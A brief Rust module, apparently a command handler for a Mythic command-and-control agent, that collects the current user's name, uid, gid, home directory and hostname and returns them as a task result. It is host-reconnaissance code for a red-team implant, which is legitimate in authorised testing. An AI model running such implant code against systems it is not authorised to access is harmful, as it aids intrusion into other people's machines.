//! Current user identity — cross-platform.

use mythic::{TaskMessage, TaskResponse};
use serde::Deserialize;

#[derive(Deserialize, Default)]
struct Params {
    #[serde(default)]
    #[allow(dead_code)]
    host: Option<String>,
}

fn run_cmd(bin: &str, args: &[&str]) -> Option<String> {
    std::process::Command::new(bin)
        .args(args)
        .output()
        .ok()
        .and_then(|o| String::from_utf8(o.stdout).ok())
        .map(|s| s.trim().to_string())
}

pub fn handle(task: &TaskMessage) -> TaskResponse {
    let _params = match serde_json::from_str::<Params>(&task.parameters) {
        Ok(p) => p,
        Err(_) => Params::default(),
    };

    #[cfg(windows)]
    let user = std::env::var("USERNAME").unwrap_or_else(|_| "unknown".into());

    #[cfg(not(windows))]
    let user = std::env::var("USER").unwrap_or_else(|_| "unknown".into());

    let home = std::env::var("HOME")
        .or_else(|_| std::env::var("USERPROFILE"))
        .unwrap_or_else(|_| "unknown".into());

    let uid = run_cmd("id", &["-u"]).unwrap_or_else(|| String::from("N/A"));
    let gid = run_cmd("id", &["-g"]).unwrap_or_else(|| String::from("N/A"));
    let hostname = run_cmd("hostname", &[]).unwrap_or_else(|| "unknown".into());

    let info = serde_json::json!({
        "user": user,
        "uid": uid,
        "gid": gid,
        "home": home,
        "hostname": hostname,
    });

    TaskResponse {
        task_id: task.id,
        completed: Some(true),
        status: Some("completed".into()),
        user_output: Some(serde_json::to_string_pretty(&info).unwrap_or_default()),
        ..Default::default()
    }
}
